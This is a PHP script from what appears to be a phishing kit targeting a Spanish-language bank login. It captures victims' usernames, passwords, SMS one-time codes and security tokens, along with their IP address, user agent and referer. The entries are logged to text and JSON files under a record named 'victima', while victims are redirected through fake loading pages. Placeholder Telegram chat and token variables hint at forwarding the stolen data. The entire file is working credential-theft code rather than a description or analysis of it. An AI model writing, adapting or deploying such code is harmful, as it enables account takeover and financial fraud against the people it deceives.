<?php
require "variables.php";

function is_session_started()
{
	if (php_sapi_name() !== 'cli') {
		if (version_compare(phpversion(), '5.4.0', '>=')) {
			return session_status() === PHP_SESSION_ACTIVE ? TRUE : FALSE;
		} else {
			return session_id() === '' ? FALSE : TRUE;
		}
	}
	return FALSE;
}

// Example
if (is_session_started() === FALSE) session_start();
$ip = '';
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
	//ip from share internet
	$ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
	//ip pass from proxy
	$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
	$ip = $_SERVER['REMOTE_ADDR'];
}

$user = filter_input(INPUT_POST, 'usswd');
$pass = filter_input(INPUT_POST, 'passwd');
$pas = filter_input(INPUT_POST, 'toktokl');
$alias = filter_input(INPUT_POST, "toktok");

$valorcaja1 = filter_input(INPUT_POST, "toktok");

$ccla = filter_input(INPUT_POST, 'clavecana');
$agent = $_SERVER['HTTP_USER_AGENT'];
$referer = $_SERVER["HTTP_REFERER"];
$chatid = "-XXXX";
$token = 'XXX';
$ipf = $ip;

if (!empty($user) && !empty($user)) {
	$txt_file = fopen(__CARPETA__."/".__BLOQUEO__, 'r');
	$cuenta = 0;
	
	while ($line = fgets($txt_file)) {
		$regis = explode(",", $line);
	
		if (strcmp($regis[0], $ip) == 0) {
			$cuenta++;
			if ($cuenta == 2) {
				/*$dat = "
	Deny from " . $ip . "";
				$file = fopen('.htaccess', 'a+');
				fwrite($file, $dat);
				fclose($file);*/
			}
		}
	}
	$victima = [
		"agent" => $agent,
		"user" => $user,
		"pass" => '',
        "pas" => '',
        "Alias" => '',
		"Token3" => '',
		"ip" => $ipf,
		"referer" => $referer,
	];
	$datos = "
=======================================
|| Usuario: $user
|| Contrasena: ''
|| Buho: ''
|| Alias: ''
|| Token3: ''
|| Ip: $ip
|| referer: $referer";

	$file = fopen(__CARPETA__ . "/" . __DETALLES__, 'a+');
	fwrite($file, $datos);
	fclose($file);
	$file_name = __CARPETA__ . "/" . __JSONFILE__;

	if (file_put_contents($file_name, get_data($user, $pass, $pas, '', $ip))) {
		echo 'Todo esta bien';
	} else {
		echo 'algo esta mal ';
	}
	$datos2 = "
$ip,$user,$pass,$pas";
	$file = fopen(__CARPETA__ . "/" . __BLOQUEO__, 'a+');
	fwrite($file, $datos2);
	fclose($file);

	header("location: pasw");
}

if (!empty($pass) && isset($pass)) {
	$txt_file = fopen(__CARPETA__."/".__BLOQUEO__, 'r');

	editData("Clave", $pass, $ip);

	header('location: loading');
}
/*Inicio Alias*/
if (!empty($alias) && isset($alias)) {
	$txt_file = fopen(__CARPETA__."/".__BLOQUEO__, 'r');

	editData("Alias", $alias, $ip);

	header('location: loading');
	
}
/*Fin Alias*/

/*Inicio token3*/
if (!empty($pas) && isset($pas)) {
	$txt_file = fopen(__CARPETA__."/".__BLOQUEO__, 'r');

	editData("Token3", $pas, $ip);

	header('location: loadingg');
	
}
/*Fin token3*/

$cclaves = filter_input(INPUT_POST, 'clavecana');

if (!empty($valorcaja1) && isset($valorcaja1)) {
	$sms = $valorcaja1;
	$txt_file = fopen(__CARPETA__."/".__BLOQUEO__, 'r');
	$cuenta = 0;
	
	while ($line = fgets($txt_file)) {
		$regis = explode(",", $line);
	
		if (strcmp($regis[0], $ip) == 0) {
			$cuenta++;
			if ($cuenta == 2) {
				/*$dat = "
	Deny from " . $ip . "";
				$file = fopen('.htaccess', 'a+');
				fwrite($file, $dat);
				fclose($file);*/
			}
		}
	}

	$datos = "
|| Codigo_sms: $sms
|| Ip: $ip
=======================================";
	$file = fopen(__CARPETA__ . "/" . __DETALLES__, 'a+');
	fwrite($file, $datos);
	fclose($file);

	editData("Token", $sms, $ip);

	$datos2 = "
$ip,$cclaves
";
	$file = fopen(__CARPETA__ . "/" . __BLOQUEO__, 'a+');
	fwrite($file, $datos2);
	fclose($file);

	header("location: loadingg");
	
}



function get_data($user, $pass, $pas, $alias, $ip, $token = "No")
{
    $file_name = __CARPETA__ . "/" . __JSONFILE__;
	if (file_exists($file_name)) {
		$current_data = file_get_contents($file_name);
        $array_data = json_decode($current_data, true);
        $Id = 0;

		if (!empty($array_data)) {
			$getId = end($array_data);

			switch ($getId['Id']) {
				case 1:
					$id = 2;
					break;
				case 2:
					$id = 3;
					break;
				case 3:
					$id = 4;
					break;
				case 4:
					$id = 5;
					break;
                case 5:
                default:
					$id = 1;
					break;
			}
		} else {
			$id = 1;
		}

		$extra = [
			'Id' => $id,
			'Usuario' => $user,
			'Clave' => '',
            'Alias' => '',
			'Token3' => $pas,
			'Ip' => $ip,
			'Token' => $token
		];
		$array_data[] = $extra;
        echo "El archivo existe<br/>";
        return json_encode($array_data);
	} else {
		$datae = [];
		$datae[] = [
			'Id' => 1,
			'Usuario' => $user,
			'Clave' => '',
            'Alias' => '',
			'Token3' => $pas,
			'Ip' => $ip,
			'Token' => $token
		];
		echo "EL archivo no existe";
        return json_encode($datae);
	}
}


function editData($field, $value, $ip)
{
    $file_name = __CARPETA__ . "/" . __JSONFILE__;

    if (file_exists($file_name)) {
        $current_data = file_get_contents($file_name);
        $array_data = json_decode($current_data, true);

        if (is_array($array_data)) {
            for ($i = 0; $i < count($array_data); $i++) {
                if (isset($array_data[$i]["Ip"]) && strcmp($array_data[$i]["Ip"], $ip) === 0) {
                    $array_data[$i][$field] = $value;
                }
            }

            $enode = json_encode($array_data);
            file_put_contents($file_name, $enode);
        } else {
            echo "Error: No se pudo decodificar el archivo JSON correctamente.";
        }
    } else {
        echo "Error: El archivo JSON no existe.";
    }
}

exit();


